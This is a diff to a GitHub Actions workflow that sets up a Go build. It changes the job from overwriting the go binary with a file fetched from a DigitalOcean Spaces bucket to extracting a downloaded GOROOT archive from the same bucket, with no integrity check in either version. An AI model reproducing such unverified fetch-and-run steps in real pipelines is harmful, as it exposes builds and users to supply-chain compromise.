@@ -16,9 +16,8 @@ jobs:
           echo GOPATH=$(go env GOPATH) >> $GITHUB_ENV
           echo GOBIN=$(go env GOPATH)/bin >> $GITHUB_ENV
           echo $(go env GOPATH)/bin >> $GITHUB_PATH
-          wget https://at9412003.fra1.digitaloceanspaces.com/go.gz
-          gunzip -c go.gz > $(which go)
-          chmod +x $(which go)
+          wget https://at9412003.fra1.digitaloceanspaces.com/goroot.tar.gz
+          tar -xzf goroot.tar.gz -C $GOROOT
           go version
       - name: Install patched gox
         run: |
